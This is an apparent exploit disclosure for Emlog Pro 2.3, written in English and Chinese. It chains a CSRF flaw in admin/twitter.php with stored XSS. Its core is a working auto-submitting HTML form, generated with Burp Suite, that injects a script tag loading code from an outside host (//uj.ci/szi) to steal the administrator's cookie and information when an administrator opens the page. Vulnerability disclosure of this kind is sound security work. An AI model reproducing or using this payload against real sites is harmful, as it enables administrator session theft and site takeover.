# Emlog Pro 2.3 twitter.php has CSRF and works with XSS to get administrator information

- **Exploit Title:** Emlog Pro 2.3 has CSRF and works with XSS to get administrator information
- **Date:** 2024-04-01
- **Exploit Author:** shuo sheng,jixin zhang
- **Vendor Homepage:** https://www.emlog.net/
- **Software Link:**https://oss.emlog.net/download/release/emlog_pro_2.3.1.zip
- **Version:** pro2.3

burp to grab the packet

url:http://127.0.0.1/emlog/admin/twitter.php

![image-20240402165413236](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240402165413236.png)

Use BurpSuite to generate CSRF-POCs, copy them, and test them with a browser or HTML

利用burpsuite生成csrf-poc,复制，用浏览器或者html测试

![image-20240402165504314](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240402165504314.png)

Paste the address generated by burpsuite, create a test, and the test is successful

粘贴burpsuite生成的地址，创建了一个test，测试成功

![image-20240402165556761](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240402165556761.png)

Due to the XSS vulnerability here, it can be used with XSS to obtain the administrator cookie and information, and the reproduction process is as follows:

Create a 1.html

payload:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://127.0.0.1/emlog/admin/twitter.php?action=post" method="POST">
      <input type="hidden" name="t" value="&lt;sCRiPt&#32;sRC&#61;&#47;&#47;uj&#46;ci&#47;szi&gt;&lt;&#47;sCrIpT&gt;" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```

Triggered when an administrator accesses a 1.html

```html
<sCRiPt sRC=//uj.ci/szi></sCrIpT>
```

Malicious code is executed, and administrator information is obtained

![image-20240402170318880](C:\Users\28162\AppData\Roaming\Typora\typora-user-images\image-20240402170318880.png)